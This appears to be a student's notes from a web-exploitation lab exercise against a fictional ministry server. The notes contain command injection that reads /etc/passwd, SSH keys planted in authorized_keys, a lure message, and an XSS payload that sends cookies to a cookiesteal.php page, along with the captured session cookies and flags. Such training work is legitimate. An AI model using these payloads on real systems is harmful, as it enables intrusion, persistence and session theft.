Donovian Web Exploitation (DWE)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
>Jump Box - r6wZBn5pmuuI 	10.50.13.237
->T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.


Establish Dynamic - 

>T1:10.100.28.40 - Enumerate using NMAP
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524 (SSH)


run a ping sweep from jump box
64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=0.325 ms (80 is closed)
64 bytes from 10.100.28.40: icmp_seq=1 ttl=63 time=0.473 ms
64 bytes from 10.100.28.48: icmp_seq=1 ttl=63 time=1.59 ms (80 exists)

UN - on 10.100.28.40 - billybob

cat of etc file - 

oot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false billybob:x:1001:1001:you found me yMTekVrn2LHjryvgIoBW:/home/billybob:/bin/bash billybob:x:1001:1001:you found me yMTekVrn2LHjryvgIoBW:/home/billybob:/bin/bash

yMTekVrn2LHjryvgIoBW

;ls -latr & netstat -rn 



Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 10.100.28.33 0.0.0.0 UG 0 0 0 ens33 10.100.28.32 0.0.0.0 255.255.255.224 U 0 0 0 ens33 total 12 -rw-r--r-- 1 root root 1581 Mar 23 2022 industry_check.php drwxr-xr-x 2 root root 4096 Apr 19 2022 . drwxr-xr-x 7 root root 4096 Apr 19 2022 .. drwxr-xr-x 7 root root 4096 Apr 19 2022 ..

;if config


ens33: flags=4163 mtu 1500 inet 10.100.28.40 netmask 255.255.255.224 broadcast 10.100.28.63 inet6 fe80::250:56ff:fe8c:2e90 prefixlen 64 scopeid 0x20 ether 00:50:56:8c:2e:90 txqueuelen 1000 (Ethernet) RX packets 197253 bytes 18761604 (18.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 394537 bytes 37418702 (37.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 device interrupt 19 base 0x2000 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 2816816 bytes 272608125 (272.6 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2816816 bytes 272608125 (272.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0


upload your key

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmf+vDzzZuJUgiBVmppKHbIPH4W0eneHuP+8aMlxE8rVjl9KrHgFUKLIhRn3qyxypS6NneSG2jh+2/09Tr/MgMwk/HVbIt6R2zxduISBeqLCgkUwWlCC2qPTX/IvAgd3nevVrX548V0Qen93vhWtFSLcVrPV7zSSakhHOwWxaNODmxkETlW789umYnj/eRYjdADS1FQTPhtGCMi8SD1HBppWrLoOM4QJehwxH5t28bv9VMYDgJMtw8KzzWwiBAyNG5AEwUTAhMY/5iKPP2vimgF/sJqFU8888wCNUK661vxfCazPen3v0FGMqKegcrPQ5s5pBDDANwXWIpxp6I2Wyv student@lin.internet.donovia" >> /home/billybob/.ssh/authorized_keys


echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1KtD6+PiAHqwb4DCI4WGcBmbawCThdzFnr/n3tHPnGmrZFfaAYcbll0TKnHg3kJdK1ooQyQYOJ90t7FBFEsPQ9hG+2WxC9iKBFbecVrjLF6P1lvlXWgMgToCUSI6W1KOPaloS+Vr1/nhYmFp0pY0h02e8uKlvH4GUWuBlpRYiXzLxhurhcmFkOiB4rCZLk+61Ucjl7I3a/AB4ubJbPDlPMoMxHzBO7HRDNMRt2BQBs52bMw6a5LcNR0vCwYUNxwIPtPzTnvoxQNi/k79TCAGrBB+e2GedgNzBss0UsAOmLW06HMNg8kHOfIMSa/RYzP5SjjTWHfZe32qogrV/V179 student@lin-ops" >> /home/billybob/.ssh/authorized_keys


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1KtD6+PiAHqwb4DCI4WGcBmbawCThdzFnr/n3tHPnGmrZFfaAYcbll0TKnHg3kJdK1ooQyQYOJ90t7FBFEsPQ9hG+2WxC9iKBFbecVrjLF6P1lvlXWgMgToCUSI6W1KOPaloS+Vr1/nhYmFp0pY0h02e8uKlvH4GUWuBlpRYiXzLxhurhcmFkOiB4rCZLk+61Ucjl7I3a/AB4ubJbPDlPMoMxHzBO7HRDNMRt2BQBs52bMw6a5LcNR0vCwYUNxwIPtPzTnvoxQNi/k79TCAGrBB+e2GedgNzBss0UsAOmLW06HMNg8kHOfIMSa/RYzP5SjjTWHfZe32qogrV/V179 student@lin-ops

cat /home/billybob/.ssh/authorized_keys


Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.

I took my online training from the following website

10.100.28.55


 <script>document.location="http://10.100.28.40/uploads/cookiesteal.php?username=" + document.cookie;</script>
 
 PHPSESSID=on08gvvpcesjplq03udithnd4b
COOKIE=4KFOAUBYEvKMdCRSWqpf; PHPSESSID=1t19jlb6hjcme7rr1ah7o882ua
